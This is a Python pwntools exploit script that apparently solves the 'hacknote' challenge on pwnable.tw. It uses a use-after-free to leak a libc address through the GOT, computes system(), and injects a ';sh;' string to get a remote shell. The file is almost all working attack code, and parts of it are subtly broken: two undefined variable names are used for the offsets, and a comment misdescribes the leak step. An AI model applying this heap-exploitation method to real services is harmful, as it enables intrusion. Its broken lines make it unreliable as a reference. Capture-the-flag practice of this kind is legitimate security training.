#!/usr/bin/env python
from pwn import *

#What I learn from this question?
#uaf,command operator of ||,and libc offset

r = remote("chall.pwnable.tw",10102)
libc = ELF('libc_32.so.6')
elf = ELF('./hacknote')
read_got = elf.got['read']
read_off = libc.symbols['read']
system_off = libc.symbols['system']
puts = 0x804862b

def ad(size,content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)

def de(index):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(index))

def dump(index):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))

ad(32,"ddaa")  #0
ad(32,"ddaa")  #1
de(0)
de(1)

payload = p32(puts)+p32(read_got)
ad(8,payload)
#now, we will write into read_got

#leak address
dump(0)
r.recvuntil(":")
read_addr = u32(r.recv(4))
libc = read_addr - libc_read_got
system_addr = libc + libc_system_got

de(2)
ad(8,p32(system_addr)+";sh;")
#ad(8,p32(system_addr+"||sh"))
#printf -> system
#system(${system};sh;)

dump(0)
r.interactive()

